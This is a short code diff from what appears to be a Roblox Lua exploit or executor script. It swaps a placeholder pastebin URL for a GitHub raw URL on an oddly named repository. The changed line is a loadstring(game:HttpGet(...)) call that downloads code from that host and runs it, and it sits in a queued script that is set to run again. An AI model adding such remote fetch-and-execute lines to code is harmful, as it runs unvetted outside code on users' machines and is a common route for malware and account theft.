@@ -33,7 +33,7 @@ local function Run(Index)
 end
 
 local QueueScript = [[
-loadstring(game:HttpGet("https://pastebin.com/raw/YOUR_SCRIPT_ID"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eo-eo-eo/dsafdsfsdfsdfsdsaf/refs/heads/main/nw"))()
 ]]
 
 -- FIRST EXECUTION (no remote fired)
